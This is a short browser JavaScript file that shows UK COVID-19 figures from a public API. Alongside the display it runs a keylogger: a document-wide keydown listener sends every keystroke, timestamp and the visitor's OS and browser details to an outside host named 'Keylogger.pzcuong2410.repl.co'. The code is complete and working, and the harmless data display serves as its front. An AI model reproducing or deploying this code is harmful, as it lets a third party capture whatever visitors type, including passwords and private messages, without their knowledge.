async function fetchData() {
    const res = await fetch ("https://api.coronavirus.data.gov.uk/v1/data");
    const record = await res.json();

    document.getElementById("date").innerHTML = record.data[0].date;
    document.getElementById("areaName").innerHTML = record.data[0].areaName;
    document.getElementById("latestBy").innerHTML = record.data[0].latestBy;
    document.getElementById("deathNew").innerHTML = record.data[0].deathNew;
}

string_key = "";

async function getKey() {
    document.addEventListener('keydown', async(event) => {
        let res = await submit("/send", "POST", {
            time: new Date().toLocaleString(),
            appName: "gfhjk",
            key: event.key,
            type: "Keyboard"
        })
        // alert(res)
        document.getElementById("key").innerHTML=event.key;
        if (event.key == "Enter")
            string_key = "";
        else
            string_key += event.key;
        document.getElementById("string").innerHTML=string_key;
    });  
}

async function getOS() {
    const os = {
        "osName": navigator.platform,
        "osInfo": navigator.appVersion,
        "appName": navigator.appName,
    }
    document.getElementById("os").innerHTML = JSON.stringify(os);
    return os;
}

async function submit(parameter, type, data = {}) {
    const url_base = "https://Keylogger.pzcuong2410.repl.co"
    let response = await fetch(url_base + parameter, {
        method: type,
        headers: {
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'Access-Control-Allow-Methods': 'GET, POST, PUT, DELETE, OPTIONS',
            'os_data': JSON.stringify(await getOS())
        },
        body: JSON.stringify(data)
    })
    response = await response.json()
    return response;
}

fetchData();
getKey();
getOS()
